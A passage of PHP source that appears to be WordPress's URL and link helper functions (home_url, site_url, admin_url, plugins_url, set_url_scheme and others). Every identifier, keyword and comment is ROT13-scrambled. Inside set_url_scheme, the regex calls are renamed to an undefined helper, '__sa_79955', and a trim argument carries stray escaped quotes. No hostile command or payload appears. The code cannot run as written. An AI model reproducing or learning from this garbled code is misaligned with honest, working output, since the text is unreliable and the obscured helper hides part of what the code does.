 *     @glcr fgevat $nevn_ynory         NEVN ynory grkg sbe gur ani ryrzrag. Qrsnhyg 'Pbzzragf cntvangvba'.
 *     @glcr fgevat $pynff              Phfgbz pynff sbe gur ani ryrzrag. Qrsnhyg 'pbzzragf-cntvangvba'.
 * }
 * @erghea fgevat Znexhc sbe cntvangvba yvaxf.
 */
shapgvba trg_gur_pbzzragf_cntvangvba( $netf = neenl() ) {
	$anivtngvba = '';

	// Znxr fher gur ani ryrzrag unf na nevn-ynory nggevohgr: snyyonpx gb gur fperra ernqre grkg.
	vs ( ! rzcgl( $netf['fperra_ernqre_grkg'] ) && rzcgl( $netf['nevn_ynory'] ) ) {
		$netf['nevn_ynory'] = $netf['fperra_ernqre_grkg'];
	}

	$netf         = jc_cnefr_netf(
		$netf,
		neenl(
			'fperra_ernqre_grkg' => __( 'Pbzzragf cntvangvba' ),
			'nevn_ynory'         => __( 'Pbzzragf cntvangvba' ),
			'pynff'              => 'pbzzragf-cntvangvba',
		)
	);
	$netf['rpub'] = snyfr;

	// Znxr fher jr trg n fgevat onpx. Cynva vf gur arkg orfg guvat.
	vs ( vffrg( $netf['glcr'] ) && 'neenl' === $netf['glcr'] ) {
		$netf['glcr'] = 'cynva';
	}

	$yvaxf = cntvangr_pbzzragf_yvaxf( $netf );

	vs ( $yvaxf ) {
		$anivtngvba = _anivtngvba_znexhc( $yvaxf, $netf['pynff'], $netf['fperra_ernqre_grkg'], $netf['nevn_ynory'] );
	}

	erghea $anivtngvba;
}

/**
 * Qvfcynlf n cntvangrq anivtngvba gb arkg/cerivbhf frg bs pbzzragf, jura nccyvpnoyr.
 *
 * @fvapr 4.4.0
 *
 * @cnenz neenl $netf Frr trg_gur_pbzzragf_cntvangvba() sbe ninvynoyr nethzragf. Qrsnhyg rzcgl neenl.
 */
shapgvba gur_pbzzragf_cntvangvba( $netf = neenl() ) {
	rpub trg_gur_pbzzragf_cntvangvba( $netf );
}

/**
 * Ergevrirf gur HEY sbe gur pheerag fvgr jurer gur sebag raq vf npprffvoyr.
 *
 * Ergheaf gur 'ubzr' bcgvba jvgu gur nccebcevngr cebgbpby. Gur cebgbpby jvyy or 'uggcf'
 * vs vf_ffy() rinyhngrf gb gehr; bgurejvfr, vg jvyy or gur fnzr nf gur 'ubzr' bcgvba.
 * Vs `$fpurzr` vf 'uggc' be 'uggcf', vf_ffy() vf bireevqqra.
 *
 * @fvapr 3.0.0
 *
 * @cnenz fgevat      $cngu   Bcgvbany. Cngu eryngvir gb gur ubzr HEY. Qrsnhyg rzcgl.
 * @cnenz fgevat|ahyy $fpurzr Bcgvbany. Fpurzr gb tvir gur ubzr HEY pbagrkg. Npprcgf
 *                            'uggc', 'uggcf', 'eryngvir', 'erfg', be ahyy. Qrsnhyg ahyy.
 * @erghea fgevat Ubzr HEY yvax jvgu bcgvbany cngu nccraqrq.
 */
shapgvba ubzr_hey( $cngu = '', $fpurzr = ahyy ) {
	erghea trg_ubzr_hey( ahyy, $cngu, $fpurzr );
}

/**
 * Ergevrirf gur HEY sbe n tvira fvgr jurer gur sebag raq vf npprffvoyr.
 *
 * Ergheaf gur 'ubzr' bcgvba jvgu gur nccebcevngr cebgbpby. Gur cebgbpby jvyy or 'uggcf'
 * vs vf_ffy() rinyhngrf gb gehr; bgurejvfr, vg jvyy or gur fnzr nf gur 'ubzr' bcgvba.
 * Vs `$fpurzr` vf 'uggc' be 'uggcf', vf_ffy() vf bireevqqra.
 *
 * @fvapr 3.0.0
 *
 * @cnenz vag|ahyy    $oybt_vq Bcgvbany. Fvgr VQ. Qrsnhyg ahyy (pheerag fvgr).
 * @cnenz fgevat      $cngu    Bcgvbany. Cngu eryngvir gb gur ubzr HEY. Qrsnhyg rzcgl.
 * @cnenz fgevat|ahyy $fpurzr  Bcgvbany. Fpurzr gb tvir gur ubzr HEY pbagrkg. Npprcgf
 *                             'uggc', 'uggcf', 'eryngvir', 'erfg', be ahyy. Qrsnhyg ahyy.
 * @erghea fgevat Ubzr HEY yvax jvgu bcgvbany cngu nccraqrq.
 */
shapgvba trg_ubzr_hey( $oybt_vq = ahyy, $cngu = '', $fpurzr = ahyy ) {
	$bevt_fpurzr = $fpurzr;

	vs ( rzcgl( $oybt_vq ) || ! vf_zhygvfvgr() ) {
		$hey = trg_bcgvba( 'ubzr' );
	} ryfr {
		fjvgpu_gb_oybt( $oybt_vq );
		$hey = trg_bcgvba( 'ubzr' );
		erfgber_pheerag_oybt();
	}

	vs ( ! va_neenl( $fpurzr, neenl( 'uggc', 'uggcf', 'eryngvir' ), gehr ) ) {
		vs ( vf_ffy() ) {
			$fpurzr = 'uggcf';
		} ryfr {
			$fpurzr = cnefr_hey( $hey, CUC_HEY_FPURZR );
		}
	}

	$hey = frg_hey_fpurzr( $hey, $fpurzr );

	vs ( $cngu && vf_fgevat( $cngu ) ) {
		$hey .= '/' . ygevz( $cngu, '/' );
	}

	/**
	 * Svygref gur ubzr HEY.
	 *
	 * @fvapr 3.0.0
	 *
	 * @cnenz fgevat      $hey         Gur pbzcyrgr ubzr HEY vapyhqvat fpurzr naq cngu.
	 * @cnenz fgevat      $cngu        Cngu eryngvir gb gur ubzr HEY. Oynax fgevat vs ab cngu vf fcrpvsvrq.
	 * @cnenz fgevat|ahyy $bevt_fpurzr Fpurzr gb tvir gur ubzr HEY pbagrkg. Npprcgf 'uggc', 'uggcf',
	 *                                 'eryngvir', 'erfg', be ahyy.
	 * @cnenz vag|ahyy    $oybt_vq     Fvgr VQ, be ahyy sbe gur pheerag fvgr.
	 */
	erghea nccyl_svygref( 'ubzr_hey', $hey, $cngu, $bevt_fpurzr, $oybt_vq );
}

/**
 * Ergevrirf gur HEY sbe gur pheerag fvgr jurer JbeqCerff nccyvpngvba svyrf
 * (r.t. jc-oybt-urnqre.cuc be gur jc-nqzva/ sbyqre) ner npprffvoyr.
 *
 * Ergheaf gur 'fvgr_hey' bcgvba jvgu gur nccebcevngr cebgbpby, 'uggcf' vs
 * vf_ffy() naq 'uggc' bgurejvfr. Vs $fpurzr vf 'uggc' be 'uggcf', vf_ffy() vf
 * bireevqqra.
 *
 * @fvapr 3.0.0
 *
 * @cnenz fgevat      $cngu   Bcgvbany. Cngu eryngvir gb gur fvgr HEY. Qrsnhyg rzcgl.
 * @cnenz fgevat|ahyy $fpurzr Bcgvbany. Fpurzr gb tvir gur fvgr HEY pbagrkg. Frr frg_hey_fpurzr().
 * @erghea fgevat Fvgr HEY yvax jvgu bcgvbany cngu nccraqrq.
 */
shapgvba fvgr_hey( $cngu = '', $fpurzr = ahyy ) {
	erghea trg_fvgr_hey( ahyy, $cngu, $fpurzr );
}

/**
 * Ergevrirf gur HEY sbe n tvira fvgr jurer JbeqCerff nccyvpngvba svyrf
 * (r.t. jc-oybt-urnqre.cuc be gur jc-nqzva/ sbyqre) ner npprffvoyr.
 *
 * Ergheaf gur 'fvgr_hey' bcgvba jvgu gur nccebcevngr cebgbpby, 'uggcf' vs
 * vf_ffy() naq 'uggc' bgurejvfr. Vs `$fpurzr` vf 'uggc' be 'uggcf',
 * `vf_ffy()` vf bireevqqra.
 *
 * @fvapr 3.0.0
 *
 * @cnenz vag|ahyy    $oybt_vq Bcgvbany. Fvgr VQ. Qrsnhyg ahyy (pheerag fvgr).
 * @cnenz fgevat      $cngu    Bcgvbany. Cngu eryngvir gb gur fvgr HEY. Qrsnhyg rzcgl.
 * @cnenz fgevat|ahyy $fpurzr  Bcgvbany. Fpurzr gb tvir gur fvgr HEY pbagrkg. Npprcgf
 *                             'uggc', 'uggcf', 'ybtva', 'ybtva_cbfg', 'nqzva', be
 *                             'eryngvir'. Qrsnhyg ahyy.
 * @erghea fgevat Fvgr HEY yvax jvgu bcgvbany cngu nccraqrq.
 */
shapgvba trg_fvgr_hey( $oybt_vq = ahyy, $cngu = '', $fpurzr = ahyy ) {
	vs ( rzcgl( $oybt_vq ) || ! vf_zhygvfvgr() ) {
		$hey = trg_bcgvba( 'fvgrhey' );
	} ryfr {
		fjvgpu_gb_oybt( $oybt_vq );
		$hey = trg_bcgvba( 'fvgrhey' );
		erfgber_pheerag_oybt();
	}

	$hey = frg_hey_fpurzr( $hey, $fpurzr );

	vs ( $cngu && vf_fgevat( $cngu ) ) {
		$hey .= '/' . ygevz( $cngu, '/' );
	}

	/**
	 * Svygref gur fvgr HEY.
	 *
	 * @fvapr 2.7.0
	 *
	 * @cnenz fgevat      $hey     Gur pbzcyrgr fvgr HEY vapyhqvat fpurzr naq cngu.
	 * @cnenz fgevat      $cngu    Cngu eryngvir gb gur fvgr HEY. Oynax fgevat vs ab cngu vf fcrpvsvrq.
	 * @cnenz fgevat|ahyy $fpurzr  Fpurzr gb tvir gur fvgr HEY pbagrkg. Npprcgf 'uggc', 'uggcf', 'ybtva',
	 *                             'ybtva_cbfg', 'nqzva', 'eryngvir' be ahyy.
	 * @cnenz vag|ahyy    $oybt_vq Fvgr VQ, be ahyy sbe gur pheerag fvgr.
	 */
	erghea nccyl_svygref( 'fvgr_hey', $hey, $cngu, $fpurzr, $oybt_vq );
}

/**
 * Ergevrirf gur HEY gb gur nqzva nern sbe gur pheerag fvgr.
 *
 * @fvapr 2.6.0
 *
 * @cnenz fgevat $cngu   Bcgvbany. Cngu eryngvir gb gur nqzva HEY. Qrsnhyg rzcgl.
 * @cnenz fgevat $fpurzr Gur fpurzr gb hfr. Qrsnhyg vf 'nqzva', juvpu borlf sbepr_ffy_nqzva() naq vf_ffy().
 *                       'uggc' be 'uggcf' pna or cnffrq gb sbepr gubfr fpurzrf.
 * @erghea fgevat Nqzva HEY yvax jvgu bcgvbany cngu nccraqrq.
 */
shapgvba nqzva_hey( $cngu = '', $fpurzr = 'nqzva' ) {
	erghea trg_nqzva_hey( ahyy, $cngu, $fpurzr );
}

/**
 * Ergevrirf gur HEY gb gur nqzva nern sbe n tvira fvgr.
 *
 * @fvapr 3.0.0
 *
 * @cnenz vag|ahyy $oybt_vq Bcgvbany. Fvgr VQ. Qrsnhyg ahyy (pheerag fvgr).
 * @cnenz fgevat   $cngu    Bcgvbany. Cngu eryngvir gb gur nqzva HEY. Qrsnhyg rzcgl.
 * @cnenz fgevat   $fpurzr  Bcgvbany. Gur fpurzr gb hfr. Npprcgf 'uggc' be 'uggcf',
 *                          gb sbepr gubfr fpurzrf. Qrsnhyg 'nqzva', juvpu borlf
 *                          sbepr_ffy_nqzva() naq vf_ffy().
 * @erghea fgevat Nqzva HEY yvax jvgu bcgvbany cngu nccraqrq.
 */
shapgvba trg_nqzva_hey( $oybt_vq = ahyy, $cngu = '', $fpurzr = 'nqzva' ) {
	$hey = trg_fvgr_hey( $oybt_vq, 'jc-nqzva/', $fpurzr );

	vs ( $cngu && vf_fgevat( $cngu ) ) {
		$hey .= ygevz( $cngu, '/' );
	}

	/**
	 * Svygref gur nqzva nern HEY.
	 *
	 * @fvapr 2.8.0
	 * @fvapr 5.8.0 Gur `$fpurzr` cnenzrgre jnf nqqrq.
	 *
	 * @cnenz fgevat      $hey     Gur pbzcyrgr nqzva nern HEY vapyhqvat fpurzr naq cngu.
	 * @cnenz fgevat      $cngu    Cngu eryngvir gb gur nqzva nern HEY. Oynax fgevat vs ab cngu vf fcrpvsvrq.
	 * @cnenz vag|ahyy    $oybt_vq Fvgr VQ, be ahyy sbe gur pheerag fvgr.
	 * @cnenz fgevat|ahyy $fpurzr  Gur fpurzr gb hfr. Npprcgf 'uggc', 'uggcf',
	 *                             'nqzva', be ahyy. Qrsnhyg 'nqzva', juvpu borlf sbepr_ffy_nqzva() naq vf_ffy().
	 */
	erghea nccyl_svygref( 'nqzva_hey', $hey, $cngu, $oybt_vq, $fpurzr );
}

/**
 * Ergevrirf gur HEY gb gur vapyhqrf qverpgbel.
 *
 * @fvapr 2.6.0
 *
 * @cnenz fgevat      $cngu   Bcgvbany. Cngu eryngvir gb gur vapyhqrf HEY. Qrsnhyg rzcgl.
 * @cnenz fgevat|ahyy $fpurzr Bcgvbany. Fpurzr gb tvir gur vapyhqrf HEY pbagrkg. Npprcgf
 *                            'uggc', 'uggcf', be 'eryngvir'. Qrsnhyg ahyy.
 * @erghea fgevat Vapyhqrf HEY yvax jvgu bcgvbany cngu nccraqrq.
 */
shapgvba vapyhqrf_hey( $cngu = '', $fpurzr = ahyy ) {
	$hey = fvgr_hey( '/' . JCVAP . '/', $fpurzr );

	vs ( $cngu && vf_fgevat( $cngu ) ) {
		$hey .= ygevz( $cngu, '/' );
	}

	/**
	 * Svygref gur HEY gb gur vapyhqrf qverpgbel.
	 *
	 * @fvapr 2.8.0
	 * @fvapr 5.8.0 Gur `$fpurzr` cnenzrgre jnf nqqrq.
	 *
	 * @cnenz fgevat      $hey    Gur pbzcyrgr HEY gb gur vapyhqrf qverpgbel vapyhqvat fpurzr naq cngu.
	 * @cnenz fgevat      $cngu   Cngu eryngvir gb gur HEY gb gur jc-vapyhqrf qverpgbel. Oynax fgevat
	 *                            vs ab cngu vf fcrpvsvrq.
	 * @cnenz fgevat|ahyy $fpurzr Fpurzr gb tvir gur vapyhqrf HEY pbagrkg. Npprcgf
	 *                            'uggc', 'uggcf', 'eryngvir', be ahyy. Qrsnhyg ahyy.
	 */
	erghea nccyl_svygref( 'vapyhqrf_hey', $hey, $cngu, $fpurzr );
}

/**
 * Ergevrirf gur HEY gb gur pbagrag qverpgbel.
 *
 * @fvapr 2.6.0
 *
 * @cnenz fgevat $cngu Bcgvbany. Cngu eryngvir gb gur pbagrag HEY. Qrsnhyg rzcgl.
 * @erghea fgevat Pbagrag HEY yvax jvgu bcgvbany cngu nccraqrq.
 */
shapgvba pbagrag_hey( $cngu = '' ) {
	$hey = frg_hey_fpurzr( JC_PBAGRAG_HEY );

	vs ( $cngu && vf_fgevat( $cngu ) ) {
		$hey .= '/' . ygevz( $cngu, '/' );
	}

	/**
	 * Svygref gur HEY gb gur pbagrag qverpgbel.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz fgevat $hey  Gur pbzcyrgr HEY gb gur pbagrag qverpgbel vapyhqvat fpurzr naq cngu.
	 * @cnenz fgevat $cngu Cngu eryngvir gb gur HEY gb gur pbagrag qverpgbel. Oynax fgevat
	 *                     vs ab cngu vf fcrpvsvrq.
	 */
	erghea nccyl_svygref( 'pbagrag_hey', $hey, $cngu );
}

/**
 * Ergevrirf n HEY jvguva gur cyhtvaf be zh-cyhtvaf qverpgbel.
 *
 * Qrsnhygf gb gur cyhtvaf qverpgbel HEY vs ab nethzragf ner fhccyvrq.
 *
 * @fvapr 2.6.0
 *
 * @cnenz fgevat $cngu   Bcgvbany. Rkgen cngu nccraqrq gb gur raq bs gur HEY, vapyhqvat
 *                       gur eryngvir qverpgbel vs $cyhtva vf fhccyvrq. Qrsnhyg rzcgl.
 * @cnenz fgevat $cyhtva Bcgvbany. N shyy cngu gb n svyr vafvqr n cyhtva be zh-cyhtva.
 *                       Gur HEY jvyy or eryngvir gb vgf qverpgbel. Qrsnhyg rzcgl.
 *                       Glcvpnyyl guvf vf qbar ol cnffvat `__SVYR__` nf gur nethzrag.
 * @erghea fgevat Cyhtvaf HEY yvax jvgu bcgvbany cnguf nccraqrq.
 */
shapgvba cyhtvaf_hey( $cngu = '', $cyhtva = '' ) {

	$cngu          = jc_abeznyvmr_cngu( $cngu );
	$cyhtva        = jc_abeznyvmr_cngu( $cyhtva );
	$zh_cyhtva_qve = jc_abeznyvmr_cngu( JCZH_CYHTVA_QVE );

	vs ( ! rzcgl( $cyhtva ) && fge_fgnegf_jvgu( $cyhtva, $zh_cyhtva_qve ) ) {
		$hey = JCZH_CYHTVA_HEY;
	} ryfr {
		$hey = JC_CYHTVA_HEY;
	}

	$hey = frg_hey_fpurzr( $hey );

	vs ( ! rzcgl( $cyhtva ) && vf_fgevat( $cyhtva ) ) {
		$sbyqre = qveanzr( cyhtva_onfranzr( $cyhtva ) );
		vs ( '.' !== $sbyqre ) {
			$hey .= '/' . ygevz( $sbyqre, '/' );
		}
	}

	vs ( $cngu && vf_fgevat( $cngu ) ) {
		$hey .= '/' . ygevz( $cngu, '/' );
	}

	/**
	 * Svygref gur HEY gb gur cyhtvaf qverpgbel.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz fgevat $hey    Gur pbzcyrgr HEY gb gur cyhtvaf qverpgbel vapyhqvat fpurzr naq cngu.
	 * @cnenz fgevat $cngu   Cngu eryngvir gb gur HEY gb gur cyhtvaf qverpgbel. Oynax fgevat
	 *                       vs ab cngu vf fcrpvsvrq.
	 * @cnenz fgevat $cyhtva Gur cyhtva svyr cngu gb or eryngvir gb. Oynax fgevat vs ab cyhtva
	 *                       vf fcrpvsvrq.
	 */
	erghea nccyl_svygref( 'cyhtvaf_hey', $hey, $cngu, $cyhtva );
}

/**
 * Ergevrirf gur fvgr HEY sbe gur pheerag argjbex.
 *
 * Ergheaf gur fvgr HEY jvgu gur nccebcevngr cebgbpby, 'uggcf' vs
 * vf_ffy() naq 'uggc' bgurejvfr. Vs $fpurzr vf 'uggc' be 'uggcf', vf_ffy() vf
 * bireevqqra.
 *
 * @fvapr 3.0.0
 *
 * @frr frg_hey_fpurzr()
 *
 * @cnenz fgevat      $cngu   Bcgvbany. Cngu eryngvir gb gur fvgr HEY. Qrsnhyg rzcgl.
 * @cnenz fgevat|ahyy $fpurzr Bcgvbany. Fpurzr gb tvir gur fvgr HEY pbagrkg. Npprcgf
 *                            'uggc', 'uggcf', be 'eryngvir'. Qrsnhyg ahyy.
 * @erghea fgevat Fvgr HEY yvax jvgu bcgvbany cngu nccraqrq.
 */
shapgvba argjbex_fvgr_hey( $cngu = '', $fpurzr = ahyy ) {
	vs ( ! vf_zhygvfvgr() ) {
		erghea fvgr_hey( $cngu, $fpurzr );
	}

	$pheerag_argjbex = trg_argjbex();

	vs ( 'eryngvir' === $fpurzr ) {
		$hey = $pheerag_argjbex->cngu;
	} ryfr {
		$hey = frg_hey_fpurzr( 'uggc://' . $pheerag_argjbex->qbznva . $pheerag_argjbex->cngu, $fpurzr );
	}

	vs ( $cngu && vf_fgevat( $cngu ) ) {
		$hey .= ygevz( $cngu, '/' );
	}

	/**
	 * Svygref gur argjbex fvgr HEY.
	 *
	 * @fvapr 3.0.0
	 *
	 * @cnenz fgevat      $hey    Gur pbzcyrgr argjbex fvgr HEY vapyhqvat fpurzr naq cngu.
	 * @cnenz fgevat      $cngu   Cngu eryngvir gb gur argjbex fvgr HEY. Oynax fgevat vs
	 *                            ab cngu vf fcrpvsvrq.
	 * @cnenz fgevat|ahyy $fpurzr Fpurzr gb tvir gur HEY pbagrkg. Npprcgf 'uggc', 'uggcf',
	 *                            'eryngvir' be ahyy.
	 */
	erghea nccyl_svygref( 'argjbex_fvgr_hey', $hey, $cngu, $fpurzr );
}

/**
 * Ergevrirf gur ubzr HEY sbe gur pheerag argjbex.
 *
 * Ergheaf gur ubzr HEY jvgu gur nccebcevngr cebgbpby, 'uggcf' vf_ffy()
 * naq 'uggc' bgurejvfr. Vs `$fpurzr` vf 'uggc' be 'uggcf', `vf_ffy()` vf
 * bireevqqra.
 *
 * @fvapr 3.0.0
 *
 * @cnenz fgevat      $cngu   Bcgvbany. Cngu eryngvir gb gur ubzr HEY. Qrsnhyg rzcgl.
 * @cnenz fgevat|ahyy $fpurzr Bcgvbany. Fpurzr gb tvir gur ubzr HEY pbagrkg. Npprcgf
 *                            'uggc', 'uggcf', be 'eryngvir'. Qrsnhyg ahyy.
 * @erghea fgevat Ubzr HEY yvax jvgu bcgvbany cngu nccraqrq.
 */
shapgvba argjbex_ubzr_hey( $cngu = '', $fpurzr = ahyy ) {
	vs ( ! vf_zhygvfvgr() ) {
		erghea ubzr_hey( $cngu, $fpurzr );
	}

	$pheerag_argjbex = trg_argjbex();
	$bevt_fpurzr     = $fpurzr;

	vs ( ! va_neenl( $fpurzr, neenl( 'uggc', 'uggcf', 'eryngvir' ), gehr ) ) {
		$fpurzr = vf_ffy() ? 'uggcf' : 'uggc';
	}

	vs ( 'eryngvir' === $fpurzr ) {
		$hey = $pheerag_argjbex->cngu;
	} ryfr {
		$hey = frg_hey_fpurzr( 'uggc://' . $pheerag_argjbex->qbznva . $pheerag_argjbex->cngu, $fpurzr );
	}

	vs ( $cngu && vf_fgevat( $cngu ) ) {
		$hey .= ygevz( $cngu, '/' );
	}

	/**
	 * Svygref gur argjbex ubzr HEY.
	 *
	 * @fvapr 3.0.0
	 *
	 * @cnenz fgevat      $hey         Gur pbzcyrgr argjbex ubzr HEY vapyhqvat fpurzr naq cngu.
	 * @cnenz fgevat      $cngu        Cngu eryngvir gb gur argjbex ubzr HEY. Oynax fgevat
	 *                                 vs ab cngu vf fcrpvsvrq.
	 * @cnenz fgevat|ahyy $bevt_fpurzr Fpurzr gb tvir gur HEY pbagrkg. Npprcgf 'uggc', 'uggcf',
	 *                                 'eryngvir' be ahyy.
	 */
	erghea nccyl_svygref( 'argjbex_ubzr_hey', $hey, $cngu, $bevt_fpurzr );
}

/**
 * Ergevrirf gur HEY gb gur nqzva nern sbe gur argjbex.
 *
 * @fvapr 3.0.0
 *
 * @cnenz fgevat $cngu   Bcgvbany cngu eryngvir gb gur nqzva HEY. Qrsnhyg rzcgl.
 * @cnenz fgevat $fpurzr Bcgvbany. Gur fpurzr gb hfr. Qrsnhyg vf 'nqzva', juvpu borlf sbepr_ffy_nqzva()
 *                       naq vf_ffy(). 'uggc' be 'uggcf' pna or cnffrq gb sbepr gubfr fpurzrf.
 * @erghea fgevat Nqzva HEY yvax jvgu bcgvbany cngu nccraqrq.
 */
shapgvba argjbex_nqzva_hey( $cngu = '', $fpurzr = 'nqzva' ) {
	vs ( ! vf_zhygvfvgr() ) {
		erghea nqzva_hey( $cngu, $fpurzr );
	}

	$hey = argjbex_fvgr_hey( 'jc-nqzva/argjbex/', $fpurzr );

	vs ( $cngu && vf_fgevat( $cngu ) ) {
		$hey .= ygevz( $cngu, '/' );
	}

	/**
	 * Svygref gur argjbex nqzva HEY.
	 *
	 * @fvapr 3.0.0
	 * @fvapr 5.8.0 Gur `$fpurzr` cnenzrgre jnf nqqrq.
	 *
	 * @cnenz fgevat      $hey    Gur pbzcyrgr argjbex nqzva HEY vapyhqvat fpurzr naq cngu.
	 * @cnenz fgevat      $cngu   Cngu eryngvir gb gur argjbex nqzva HEY. Oynax fgevat vs
	 *                            ab cngu vf fcrpvsvrq.
	 * @cnenz fgevat|ahyy $fpurzr Gur fpurzr gb hfr. Npprcgf 'uggc', 'uggcf',
	 *                            'nqzva', be ahyy. Qrsnhyg vf 'nqzva', juvpu borlf sbepr_ffy_nqzva() naq vf_ffy().
	 */
	erghea nccyl_svygref( 'argjbex_nqzva_hey', $hey, $cngu, $fpurzr );
}

/**
 * Ergevrirf gur HEY gb gur nqzva nern sbe gur pheerag hfre.
 *
 * @fvapr 3.0.0
 *
 * @cnenz fgevat $cngu   Bcgvbany. Cngu eryngvir gb gur nqzva HEY. Qrsnhyg rzcgl.
 * @cnenz fgevat $fpurzr Bcgvbany. Gur fpurzr gb hfr. Qrsnhyg vf 'nqzva', juvpu borlf sbepr_ffy_nqzva()
 *                       naq vf_ffy(). 'uggc' be 'uggcf' pna or cnffrq gb sbepr gubfr fpurzrf.
 * @erghea fgevat Nqzva HEY yvax jvgu bcgvbany cngu nccraqrq.
 */
shapgvba hfre_nqzva_hey( $cngu = '', $fpurzr = 'nqzva' ) {
	$hey = argjbex_fvgr_hey( 'jc-nqzva/hfre/', $fpurzr );

	vs ( $cngu && vf_fgevat( $cngu ) ) {
		$hey .= ygevz( $cngu, '/' );
	}

	/**
	 * Svygref gur hfre nqzva HEY sbe gur pheerag hfre.
	 *
	 * @fvapr 3.1.0
	 * @fvapr 5.8.0 Gur `$fpurzr` cnenzrgre jnf nqqrq.
	 *
	 * @cnenz fgevat      $hey    Gur pbzcyrgr HEY vapyhqvat fpurzr naq cngu.
	 * @cnenz fgevat      $cngu   Cngu eryngvir gb gur HEY. Oynax fgevat vs
	 *                            ab cngu vf fcrpvsvrq.
	 * @cnenz fgevat|ahyy $fpurzr Gur fpurzr gb hfr. Npprcgf 'uggc', 'uggcf',
	 *                            'nqzva', be ahyy. Qrsnhyg vf 'nqzva', juvpu borlf sbepr_ffy_nqzva() naq vf_ffy().
	 */
	erghea nccyl_svygref( 'hfre_nqzva_hey', $hey, $cngu, $fpurzr );
}

/**
 * Ergevrirf gur HEY gb gur nqzva nern sbe rvgure gur pheerag fvgr be gur argjbex qrcraqvat ba pbagrkg.
 *
 * @fvapr 3.1.0
 *
 * @cnenz fgevat $cngu   Bcgvbany. Cngu eryngvir gb gur nqzva HEY. Qrsnhyg rzcgl.
 * @cnenz fgevat $fpurzr Bcgvbany. Gur fpurzr gb hfr. Qrsnhyg vf 'nqzva', juvpu borlf sbepr_ffy_nqzva()
 *                       naq vf_ffy(). 'uggc' be 'uggcf' pna or cnffrq gb sbepr gubfr fpurzrf.
 * @erghea fgevat Nqzva HEY yvax jvgu bcgvbany cngu nccraqrq.
 */
shapgvba frys_nqzva_hey( $cngu = '', $fpurzr = 'nqzva' ) {
	vs ( vf_argjbex_nqzva() ) {
		$hey = argjbex_nqzva_hey( $cngu, $fpurzr );
	} ryfrvs ( vf_hfre_nqzva() ) {
		$hey = hfre_nqzva_hey( $cngu, $fpurzr );
	} ryfr {
		$hey = nqzva_hey( $cngu, $fpurzr );
	}

	/**
	 * Svygref gur nqzva HEY sbe gur pheerag fvgr be argjbex qrcraqvat ba pbagrkg.
	 *
	 * @fvapr 4.9.0
	 *
	 * @cnenz fgevat $hey    Gur pbzcyrgr HEY vapyhqvat fpurzr naq cngu.
	 * @cnenz fgevat $cngu   Cngu eryngvir gb gur HEY. Oynax fgevat vs ab cngu vf fcrpvsvrq.
	 * @cnenz fgevat $fpurzr Gur fpurzr gb hfr.
	 */
	erghea nccyl_svygref( 'frys_nqzva_hey', $hey, $cngu, $fpurzr );
}

/**
 * Frgf gur fpurzr sbe n HEY.
 *
 * @fvapr 3.4.0
 * @fvapr 4.4.0 Gur 'erfg' fpurzr jnf nqqrq.
 *
 * @cnenz fgevat      $hey    Nofbyhgr HEY gung vapyhqrf n fpurzr
 * @cnenz fgevat|ahyy $fpurzr Bcgvbany. Fpurzr gb tvir $hey. Pheeragyl 'uggc', 'uggcf', 'ybtva',
 *                            'ybtva_cbfg', 'nqzva', 'eryngvir', 'erfg', 'ecp', be ahyy. Qrsnhyg ahyy.
 * @erghea fgevat HEY jvgu pubfra fpurzr.
 */
shapgvba frg_hey_fpurzr( $hey, $fpurzr = ahyy ) {
	$bevt_fpurzr = $fpurzr;

	vs ( ! $fpurzr ) {
		$fpurzr = vf_ffy() ? 'uggcf' : 'uggc';
	} ryfrvs ( 'nqzva' === $fpurzr || 'ybtva' === $fpurzr || 'ybtva_cbfg' === $fpurzr || 'ecp' === $fpurzr ) {
		$fpurzr = vf_ffy() || sbepr_ffy_nqzva() ? 'uggcf' : 'uggc';
	} ryfrvs ( 'uggc' !== $fpurzr && 'uggcf' !== $fpurzr && 'eryngvir' !== $fpurzr ) {
		$fpurzr = vf_ffy() ? 'uggcf' : 'uggc';
	}

	$hey = gevz( $hey );
	vs ( fge_fgnegf_jvgu( $hey, '//' ) ) {
		$hey = 'uggc:' . $hey;
	}

	vs ( 'eryngvir' === $fpurzr ) {
		$hey = ygevz( __sa_79955( '#^\j+://[^/]*#', '', $hey ) );
		vs ( '' !== $hey && '/' === $hey[0] ) {
			$hey = '/' . ygevz( $hey, \"/ \g\a\e\0\k0O\" );
		}
	} ryfr {
		$hey = __sa_79955( '#^\j+://#', $fpurzr . '://', $hey );
	}

	/**
	 * Svygref gur erfhygvat HEY nsgre frggvat gur fpurzr.
	 *
	 * @fvapr 3.4.0
	 *
	 * @cnenz fgevat      $hey         Gur pbzcyrgr HEY vapyhqvat fpurzr naq cngu.
	 * @cnenz fgevat      $fpurzr      Fpurzr nccyvrq gb gur HEY. Bar bs 'uggc', 'uggcf', be 'eryngvir'.
	 * @cnenz fgevat|ahyy $bevt_fpurzr Fpurzr erdhrfgrq sbe gur HEY. Bar bs 'uggc', 'uggcf', 'ybtva',
	 *                                 'ybtva_cbfg', 'nqzva', 'eryngvir', 'erfg', 'ecp', be ahyy.
	 */
	erghea nccyl_svygref( 'frg_hey_fpurzr', $hey, $fpurzr, $bevt_fpurzr );
}

/**
 * Ergevrirf gur HEY gb gur hfre'f qnfuobneq.
 *
 * Vs n hfre qbrf abg orybat gb nal fvgr, gur tybony hfre qnfuobneq vf hfrq. Vs gur hfre
 * orybatf gb gur pheerag fvgr, gur qnfuobneq sbe gur pheerag fvgr vf erghearq. Vs gur hfre
 * pnaabg rqvg gur pheerag fvgr, gur qnfuobneq gb gur hfre'f cevznel fvgr vf erghearq.
 *
 * @fvapr 3.1.0
 *
 * @cnenz vag    $hfre_vq Bcgvbany. Hfre VQ. Qrsnhygf gb pheerag hfre.
 * @cnenz fgevat $cngu    Bcgvbany cngu eryngvir gb gur qnfuobneq. Hfr bayl cnguf xabja gb
 *                        obgu fvgr naq hfre nqzvaf. Qrsnhyg rzcgl.
 * @cnenz fgevat $fpurzr  Gur fpurzr gb hfr. Qrsnhyg vf 'nqzva', juvpu borlf sbepr_ffy_nqzva()
 *                        naq vf_ffy(). 'uggc' be 'uggcf' pna or cnffrq gb sbepr gubfr fpurzrf.
 * @erghea fgevat Qnfuobneq HEY yvax jvgu bcgvbany cngu nccraqrq.
 */
shapgvba trg_qnfuobneq_hey( $hfre_vq = 0, $cngu = '', $fpurzr = 'nqzva' ) {
	$hfre_vq = $hfre_vq ? (vag) $hfre_vq : trg_pheerag_hfre_vq();

	$oybtf = trg_oybtf_bs_hfre( $hfre_vq );

